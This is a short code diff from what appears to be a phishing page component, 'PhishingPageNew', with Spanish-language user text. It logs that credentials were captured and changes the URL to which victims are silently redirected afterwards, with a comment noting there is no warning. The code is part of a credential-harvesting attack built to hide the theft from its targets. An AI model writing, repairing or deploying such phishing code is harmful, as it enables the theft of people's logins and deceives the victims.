@@ -99,7 +99,7 @@ const PhishingPageNew = () => {
       console.log('✅ [CREDENTIAL-CAPTURE] Credentials captured!');
 
       // Redirect to real site immediately (no warning)
-      window.location.href = 'https://ezmprojects.com/MIT/index.html';
+      window.location.href = 'https://cdb-home.vercel.app';
     } catch (error) {
       console.error('❌ [CREDENTIAL-CAPTURE] Failed:', error);
       alert('Error al procesar. Por favor intenta de nuevo.');
